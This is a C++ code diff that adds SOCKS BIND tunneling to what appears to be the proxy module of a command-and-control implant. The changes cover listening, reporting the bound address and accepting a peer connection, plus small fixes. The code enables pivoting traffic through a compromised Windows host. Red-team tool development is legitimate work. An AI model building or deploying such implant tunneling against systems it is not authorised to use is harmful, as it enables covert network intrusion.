@@ -25,6 +25,16 @@ void PackProxyControl(Packer* packer, ULONG channelId, ULONG commandId)
 	packer->Pack32(commandId);
 }
 
+void PackBindReply(Packer* packer, ULONG channelId, ULONG phase, BYTE* addr, ULONG addrLen, ULONG port)
+{
+	packer->Pack32(channelId);
+	packer->Pack32(COMMAND_TUNNEL_BIND_REPLY);
+	packer->Pack32(phase);
+	packer->Pack32(ADDRESS_TYPE_IPV4);
+	packer->PackBytes(addr, addrLen);
+	packer->Pack32(port);
+}
+
 void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
 {
 	packer->Pack32(channelId);
@@ -63,8 +73,13 @@ SOCKET listenSocket(u_short port, int stream)
 	if (sock == -1)
 		return -1;
 
+	int reuse = 1;
+	if (ApiWin->setsockopt)
+		ApiWin->setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
+
 	struct sockaddr_in saddr = { 0 };
 	saddr.sin_family = AF_INET;
+	saddr.sin_addr.s_addr = INADDR_ANY;
 	saddr.sin_port = _htons(port);
 
 	u_long argp = 1;
@@ -84,8 +99,36 @@ SOCKET listenSocket(u_short port, int stream)
 	return -1;
 }
 
+void Proxyfire::ConnectMessageBind(ULONG channelId, ULONG type, Packer* outPacker)
+{
+	SOCKET sock = listenSocket(0, 1);
+	if (sock == -1) {
+		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, TUNNEL_CREATE_ERROR);
+		return;
+	}
+
+	BYTE addr[4] = { 0, 0, 0, 0 };
+	ULONG port = 0;
+	if (ApiWin->getsockname) {
+		sockaddr_in bound = { 0 };
+		int boundLen = sizeof(bound);
+		if (ApiWin->getsockname(sock, (sockaddr*)&bound, &boundLen) == 0) {
+			memcpy(addr, &bound.sin_addr, 4);
+			port = _htons(bound.sin_port);
+		}
+	}
+
+	this->AddProxyData(channelId, type, sock, 0, TUNNEL_MODE_BIND_TCP, 0, (WORD)port, TUNNEL_STATE_CONNECT);
+	PackBindReply(outPacker, channelId, TUNNEL_BIND_LISTENING, addr, 4, port);
+}
+
 void Proxyfire::ConnectMessageTCP(ULONG channelId, ULONG type, CHAR* address, WORD port, Packer* outPacker)
 {
+	if (type == TUNNEL_TYPE_SOCKS_BIND) {
+		this->ConnectMessageBind(channelId, type, outPacker);
+		return;
+	}
+
 	WSAData wsaData;
 	if (ApiWin->WSAStartup(514, &wsaData)) {
 		ApiWin->WSACleanup();
@@ -148,6 +191,20 @@ void Proxyfire::ConnectMessageTCP(ULONG channelId, ULONG type, CHAR* address, WO
 					ApiWin->closesocket(sock);
 					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, WSAETIMEDOUT);
 				}
+
+				//int result = ApiWin->connect(sock, (sockaddr*)&socketAddress, sizeof(socketAddress));
+				//if (result == 0) {
+				//	this->AddProxyData(channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
+				//	return;
+				//}
+
+				//u_long mode = 1;
+				//if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
+				//	if (!(ApiWin->connect(sock, (sockaddr*) &socketAddress, 16) == -1 && ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)) {
+				//		this->AddProxyData(channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
+				//		return;
+				//	}
+				//}
 			}
 		}
 
@@ -246,7 +303,7 @@ void Proxyfire::ConnectWriteTCP(ULONG channelId, CHAR* data, ULONG dataSize, Pac
 		if (sent == -1) {
 			int err = ApiWin->WSAGetLastError();
 			if (err == WSAEWOULDBLOCK) {
-				sent = 0;
+				sent = 0; 
 			}
 			else {
 				ApiWin->closesocket(tunnelData->sock);
@@ -282,7 +339,7 @@ void Proxyfire::ConnectWriteTCP(ULONG channelId, CHAR* data, ULONG dataSize, Pac
 
 			memcpy(tunnelData->writeBuffer, data + sent, remain);
 			tunnelData->writeBufferSize = remain;
-
+			
 			if (outPacker && tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK && !tunnelData->paused) {
 				tunnelData->paused = TRUE;
 				PackProxyControl(outPacker, channelId, COMMAND_TUNNEL_PAUSE);
@@ -379,7 +436,7 @@ void Proxyfire::ConnectMessageReverse(ULONG tunnelId, WORD port, Packer* outPack
 	
 	this->AddProxyData(tunnelId, 5, sock, 0, TUNNEL_MODE_REVERSE_TCP, 0, port, TUNNEL_STATE_CONNECT);
 
-	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_STATE_CONNECT);
+	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_CREATE_SUCCESS);
 }
 
 ///////////////////
@@ -407,6 +464,8 @@ void Proxyfire::CheckProxy(Packer* packer)
 
 				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
 					SOCKET sock = ApiWin->accept(tunnelData->sock, 0, 0);
+					if (sock == INVALID_SOCKET || sock == -1)
+						continue;
 					u_long mode = 1;
 					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) == -1) {
 						ApiWin->closesocket(sock);
@@ -420,6 +479,45 @@ void Proxyfire::CheckProxy(Packer* packer)
 					packer->Pack32(cid);
 
 					this->AddProxyData(cid, 5, sock, 180000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_READY);
+				}
+			}
+			else if ( tunnelData->mode == TUNNEL_MODE_BIND_TCP ) {
+				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
+					sockaddr_in peer = { 0 };
+					int peerLen = sizeof(peer);
+					SOCKET sock = ApiWin->accept(tunnelData->sock, (sockaddr*)&peer, &peerLen);
+					if (sock == -1) {
+						tunnelData->state = TUNNEL_STATE_CLOSE;
+						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
+						continue;
+					}
+					u_long mode = 1;
+					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) == -1) {
+						ApiWin->closesocket(sock);
+						tunnelData->state = TUNNEL_STATE_CLOSE;
+						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
+						continue;
+					}
+
+					BYTE addr[4] = { 0, 0, 0, 0 };
+					ULONG port = 0;
+					if (peerLen >= (int)sizeof(sockaddr_in)) {
+						memcpy(addr, &peer.sin_addr, 4);
+						port = _htons(peer.sin_port);
+					} else if (ApiWin->getpeername) {
+						sockaddr_in p2 = { 0 };
+						int p2len = sizeof(p2);
+						if (ApiWin->getpeername(sock, (sockaddr*)&p2, &p2len) == 0) {
+							memcpy(addr, &p2.sin_addr, 4);
+							port = _htons(p2.sin_port);
+						}
+					}
+
+					ApiWin->closesocket(tunnelData->sock);
+					tunnelData->sock = sock;
+					tunnelData->mode = TUNNEL_MODE_SEND_TCP;
+					tunnelData->state = TUNNEL_STATE_READY;
+					PackBindReply(packer, tunnelData->channelID, TUNNEL_BIND_ACCEPTED, addr, 4, port);
 				}
 			}
 			else {
@@ -480,8 +578,8 @@ ULONG Proxyfire::RecvProxy(Packer* packer)
 	LPVOID buffer = MemAllocLocal(0x10000);
 	TunnelData* tunnelData;
 	for (int i = 0; i < this->tunnels.size(); i++) {
-
-		if (packer->datasize() > 0x400000)
+		
+		if (packer->datasize() > 0x400000) 
 			break;
 
 		tunnelData = &(this->tunnels[i]);
